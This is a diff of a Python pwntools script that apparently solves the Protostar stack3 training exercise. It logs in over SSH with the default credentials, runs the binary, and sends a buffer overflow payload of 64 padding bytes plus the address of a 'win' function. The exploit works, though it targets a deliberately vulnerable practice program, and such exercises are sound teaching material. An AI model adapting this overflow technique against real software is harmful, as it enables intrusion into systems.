@@ -1,3 +1,4 @@
+
 from pwn import *
 import os
 
@@ -6,8 +7,11 @@ shell = ssh('user', ip, password='user')
 sh = shell.run("sh")
 sh.sendline("cd /opt/protostar/bin/")
 
-exploit = "A"*500
 
+win = 0x8048424
+exploit = "A"*64 + p32(win)
 sh.sendline("./stack3")
+print(sh.recvline(timeout=1))
 sh.sendline(exploit)
-print(sh.recvline())
+print(sh.recvline(timeout=1))
+print(sh.recvline(timeout=1))
